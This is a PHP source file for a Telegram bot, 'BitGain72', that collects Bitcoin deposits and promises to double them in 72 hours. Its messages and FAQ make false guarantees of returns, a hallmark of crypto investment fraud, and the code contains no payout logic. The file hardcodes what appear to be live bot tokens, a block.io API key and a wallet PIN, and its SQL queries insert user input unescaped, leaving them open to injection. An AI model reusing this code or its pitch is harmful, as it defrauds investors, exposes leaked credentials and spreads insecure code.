<?php 
//https://api.telegram.org/bot641797277:AAFM1atEOtjlI3lNT0F-HrBSzSCII0ZDqO0/setwebhook?url=https://coinware.co/test_bot.php

//https://api.telegram.org/bot897472693:AAHKD9n_5lO-j6uAVQIpkmySFXGcYgF95_Y/deletewebhook?url=https://wisechoiceinvestment.com/bitgain/bitgain.php
//https://api.telegram.org/bot897472693:AAHKD9n_5lO-j6uAVQIpkmySFXGcYgF95_Y/setwebhook?url=https://bitgain.club/bitGain/bitgain.php

require_once __DIR__.'/includes/dbconfig.php';
include_once __DIR__.'/includes/functions.php';

require_once("block_io.php");


//8116-477c-520e-5cd7 -mendyak99


$apiKey = "8116-477c-520e-5cd7";
$version = 2; // API version
$pin = "55kmn)%+Zs_block.io";
$block_io = new BlockIo($apiKey, $pin, $version);

define('token', '897472693:AAHKD9n_5lO-j6uAVQIpkmySFXGcYgF95_Y');




include "functions.php" ;


/*

$newAddressInfo= $block_io->get_new_address(array());
        

$id=$newAddressInfo->data->user_id;
$address = $newAddressInfo->data->address;
$label = $newAddressInfo->data->label;
echo $address;*/

//$address1 = '2N6cnR3vbpiyAKFHyGmKfHyb1FTBSiZr7Bf';

//$balance_query = $block_io->get_address_balance(array('addresses' => '.tp_deposit_address.'));
  //    $balance_query= $block_io->get_address_balance(array('addresses' => $address1));
//print_r($balance_query);
 // $available_balance = $balance_query->data->available_balance;
//echo $available_balance;


 $message = 'Hi '.$username.', Welcome to BitGain72 Bot                                                                                                                                                                                 Start doubling your Bitcoins today.                                                                                                                                                                                 💵 100% after 72 hours.                                                                                                                                            💴 minimum invest: 0.0001 BTC                                                                                                                                                                                                                             💴 no withdraw minimum                                                                                                                                                                                 ✅ instant automatic payouts                                                                                                                                                                                 ✅ Your Investment will be created within few minutes after you make deposit                                                                                                                                                                                 🇬🇧 Our Community: @Bitgain_community                                                                                                                                                                                                                                                                                                                                                                   💸 Our Payouts channel: @bitgain_payments'  ;

$exit_message = 'Sorry '.$username.', I dont get it. Start talking to me with /start';
$deposit_message = 'Make deposit to: ';
$ref_link = 'https://t.me/bitGain72_bot/?start='.$cid.'';

//$server_time =time();
//$date = date('Y-m-d h:i:s A',strtotime($server_time));
 $current_time = time();
                    
$current_date = date('Y-m-d H:i:s A' , $current_time);




$check_past_reg = mysqli_query($con,"SELECT * FROM tp_users WHERE tp_user_unique_id = '$cid'");
$num_of_past_reg=mysqli_num_rows($check_past_reg);



//if (isset($message['text'])){

if(strpos($text, "/start") === 0){
    
    
    
if(isset($_GET['start']))
{ $ref = checkValues($_GET['/start']);  echo $ref; }else{ $ref = 'lord'; }  
    //save username into database
    
    if($num_of_past_reg == 0)
    {
    
    $save_to_db = mysqli_query($con,"INSERT INTO tp_users(tp_user_unique_id,tp_username,tp_upliner_id)VALUES('$cid','$username','$ref')");
    
    
    }
         
          send($cid, $message );
    
    $keyboard = [
    ["💰 Deposit", "📋 My investments"],["💳 set Bitcoin address", "❓Help"],["🚀 Affiliate Link","📋 F.A.Q"],
];
$key = array(
"resize_keyboard" => true,
"keyboard" => $keyboard,
);
   keyboard($key, "Use buttons below", $cid);
    
   
    
    
    
    }
   


if($text == "💰 Deposit"){
    
    $null = 'NULL';
$check_past_generated = mysqli_query($con,"SELECT * FROM tp_users WHERE tp_user_unique_id = '$cid' AND tp_deposit_address == '' ");
    
    //echo $check_past_generated;
    if($check_past_generated == 1){
        
       
        
          //generate new addresss
    
$newAddressInfo= $block_io->get_new_address(array());
        

$id=$newAddressInfo->data->user_id;
$address = $newAddressInfo->data->address;
$label = $newAddressInfo->data->label;
        
        
         
     $save_deposit_address =mysqli_query($con,"UPDATE tp_users SET tp_deposit_address = '$address' WHERE tp_user_unique_id = '$cid' ");
    
     send($cid, $deposit_message );
     send($cid,$address);
     send($cid,'Send only btc to this address. thank you');
        
        
       
        
    }   elseif($check_past_generated==0){
    
     
        
        
        
     $num_of_past_generated = mysqli_num_rows($check_past_generated);
        echo $num_of_past_generated;
        //load from database
        $get_address = mysqli_query($con,"SELECT * FROM tp_users WHERE tp_user_unique_id = '$cid' ");
        $deposit_address_row =  mysqli_fetch_array($get_address);
        $deposit_address = $deposit_address_row['tp_deposit_address'];
        
        
     //  $balance_query= $block_io->get_address_balance(array('addresses' => $deposit_address));
      // $balance_query= $block_io->get_address_balance(array('addresses' => '2N6cnR3vbpiyAKFHyGmKfHyb1FTBSiZr7Bf'))
      //  $available_balance = $balance_query->data->available_balance;
        // $save_deposit_address =mysqli_query($con,"UPDATE tp_users SET tp_deposit_amount = '$available_balance' WHERE tp_user_unique_id = '$cid' ");
           // send($cid, 1 );
        
            send($cid, $deposit_message );
            send($cid,$deposit_address);
            send($cid,'Send only btc to this address. thank you');
          // send($cid,$num_of_past_generated);    
        
}
    
    
    
    
        
  
    
}


if($text == "💳 set Bitcoin address"){
    
     send($cid, 'Please submit your personal Bitcoin address.' );
     send($cid, 'Example: 1AUqWe6oTe8kiVN1tHftVVpK4gUQPiJMbH ' );
    
    ///$get_address  = $text;
    
    //if( $get_address){
    
   // $btc_address= $get_address;
   // send($cid,$get_address);
   //  $add_address_query = mysqli_query($con,"UPDATE tp_users SET tp_withdrawal_address = '$btc_address' WHERE tp_user_unique_id = '$cid' ");
   // }
    
    
}

$string = $text;
$set_command1 = substr($string, 0, 3);
$set_command2 = substr($string, 0, 1);

if($set_command2  == "1" || $set_command2  == "3" || $set_command1  == "bc1"){
    
    $withdrawal_address = ltrim($text, ' ');
    $withdrawal_address = trim($withdrawal_address);
    
    $add_address_query = mysqli_query($con,"UPDATE tp_users SET tp_withdrawal_address = '$withdrawal_address' WHERE tp_user_unique_id = '$cid' ");
    
    if( $add_address_query){
    
    send($cid, 'We have set the following as your withdrawal address: '.$withdrawal_address.'' );
    }  
}

//elseif($set_command2  != "1" || $set_command2  != "3" || $set_command1  != "bc1"){
    
 //   send($cid, 'Invalid Bitcoin address.Kindly check your address' );
//}


if($text == "🚀 Affiliate Link") {   
    
     send($cid, 'Your personal Referral-link is:' );
     send($cid, $ref_link);
    
}

  


if($text == "📋 My investments") {   
    
    
        $null = 'NULL';
$check_past_invested = mysqli_query($con,"SELECT * FROM tp_users WHERE tp_user_unique_id = '$cid' AND tp_deposit_amount != ' ' ");
    
    if($check_past_invested==1){
    
     //load from database
        $get_address = mysqli_query($con,"SELECT * FROM tp_users WHERE tp_user_unique_id = '$cid' ");
        $deposit_address_row =  mysqli_fetch_array($get_address);
        $deposit_address = $deposit_address_row['tp_deposit_address'];
       $balance_query= $block_io->get_address_balance(array('addresses' => $deposit_address));
      // $balance_query= $block_io->get_address_balance(array('addresses' => '2N6cnR3vbpiyAKFHyGmKfHyb1FTBSiZr7Bf'))
    // $available_balance = $balance_query->data->available_balance;
        
        
        $balance_array = $balance_query->data->balances;
        $balance_index = $balance_array[0];
     
        
         $available_balance = $balance_index->available_balance;
        $receive_amount = 2*$available_balance;
         $save_deposit_address =mysqli_query($con,"UPDATE tp_users SET tp_deposit_amount = '$available_balance' WHERE tp_user_unique_id = '$cid' ");
    
     send($cid, 'Server time:'.$current_date.'
     
     Amount Deposited: '.$available_balance.'
     
     Amount To receive: '.$receive_amount.'
     ' );
    } elseif($check_past_invested==0){
        
         $get_amount = mysqli_query($con,"SELECT * FROM tp_users WHERE tp_user_unique_id = '$cid' ");
        
         $deposit_amount_row =  mysqli_fetch_array($get_amount);
        $deposit_amount = $deposit_amount_row['tp_deposit_amount'];
         $receive_amount = 2*$deposit_amount;
        
        
         send($cid, 'Server time:'.$current_date.'
     
     Amount Deposited: '.$deposit_amount.'
     
     Amount To receive: '.$receive_amount.'
     ' );
    }
     
    
    
}



if($text == "📋 F.A.Q") {   
    
     send($cid, ' Q: What does BitGain72 bot do?
        
A: When you invest your money, you will receive double the amount you invested in only 72 hours!!
        

Q: How does BitGain72 bot work?
        
A: After you invest our tested algorithm for bitcoin gambling will do its magic and will get you double your money!!
        

Q: Can you change your BTC payout address after you have invested?
        
A: You can change your payout address as many times as you want, before or after you invest. 
        

Q: Is this legit?
        
A: Yes, in the official BitGain72 group you can see many payouts if you scroll up.
        

Q: Can you put in multiple investments at once?
        
A: Yes, you can put an unlimited number of investments at the same time.
        

Q: What is the minimum?
        
A: The minimum investment is 0.0001 BTC.
        

Q: What is the maximum investment?
        
A: There is no maximum investment! :)
        

Q: How can I spot fake BitGain72 bots?
        
A: Make sure the name is exactly BitGain72 or just incase you can dm the admin!
        

Q: When will the bot get my deposit?
        
A: The bot will start after only one confirmation ' );
     
    
}

if($text == "❓Help") {   
    
     send($cid, '❓If you need any help contact:

@bitGain72Admin
@bitGain72Support

Join our chat
Community: @Bitgain_community
Join our payment channel
@bitgain_payments
Join our news channel
https://t.me/bitGain72_news' );
    
    
     send($cid, 'Where to buy Bitcoins

South Africa
1. www.luno.com
2. www.altcointrader.co.za 
3. Localbitcoin.com
4. www.coinmama.com 

Kenya
1. www.localbitcoins.com 
2. www.coinmama.com 
3. www.belfrics.io 
4. www.bitpesa.com 
5. www.remitano.com 

Nigeria
1. www.remitano.com 
2. www.luno.com 
3. www.localbitcoins.com 

Botswana
1. www.spectrocoin.com
2.  www.flux.com 
3.  www.coinmama.com 
4. www.localbitcoins.com 
Ghana
1. www.localbitcoins.com  
2. www.coinmama.com

Namibia
1. www.coinmama.com 
2. www.altcointrader.co.za
Malawi
1. www.coinmama.com 
2.  www.cex.io 
Zambia
1. www.coinmama.com 
2. www.cex.io 
Mozambique
1. Coinmama.com
2
Swaziland/Lesotho
1. www.altcointrader.co.za 
2. www.coinmama.com 
Zimbabwe
1. www.golix.com 
2. www.localbitcoins.com 
Tanzania
1. www.localbitcoins.com 
2. www.remitano.com 
3. www.coinmama.com 
United Kingdom
1. www.spectrocoin.com 
2. www.luno.com 
3. www.worldwidebitcoin.com
4. www.localbitcoins.com
India 
Localbitcoins.com
Paxfull.com' );
     
    
} 

    
   
//}
 /*if($text =='keyboard'){
$keyboard = [
    ["💰 Deposit", "📋 My investments"],["💳 set Bitcoin address", "💸 Payout"],
    //["🚀 Affiliate", "❓ Help"],
];
$key = array(
"resize_keyboard" => true,
"keyboard" => $keyboard,
);
   keyboard($key, " ", $cid);

/*/ 







































/*

$url= define ('url',"https://api.telegram.org/bot799506433:AAGRNO9Ub65kGOebYHMZ2h-OmuRjpB-0ilQ/");

$update = json_decode(file_get_contents('php://input') ,true);

$user_text = $update['message']['text'];


$chat_id = $update['message']['chat']['id'];

$name = $update['message']['from']['first_name'];

echo $user_text; 

//if($user_text == 'start'){
    $message = 'Hi '.$name.', Welcome to ethX.io Bot                                                                                                                            Start doubling your Bitcoins today.                                                                                                                            💵 100% after 100 hours.                                                                                       💴 minimum invest: 0.0001 BTC                                                                                                                                                                        💴 no withdraw minimum                                                                                                                            ✅ instant automatic payouts                                                                                                                            ✅ Your Investment will be created within few minutes after you make deposit                                                                                                                            🇬🇧 Our Community: @ethx_EN                                                                                                                            ✉️ Our News Channel: @ethx_Announcement                                                                                                                            💸 Our Payouts channel: @ethx__payments'  ;
 
$exit_message = 'Sorry '.$name.', I dont get it. Start talking to me with /start';

if($user_text == '/start'){
    
   file_get_contents("https://api.telegram.org/bot799506433:AAGRNO9Ub65kGOebYHMZ2h-OmuRjpB-0ilQ/sendMessage?chat_id={$chat_id}&text={$message }&disable_web_page_preview='0'");
 

}else{
     file_get_contents("https://api.telegram.org/bot799506433:AAGRNO9Ub65kGOebYHMZ2h-OmuRjpB-0ilQ/sendMessage?chat_id={$chat_id}&text={$exit_message }&disable_web_page_preview='0'");
}

*/




?>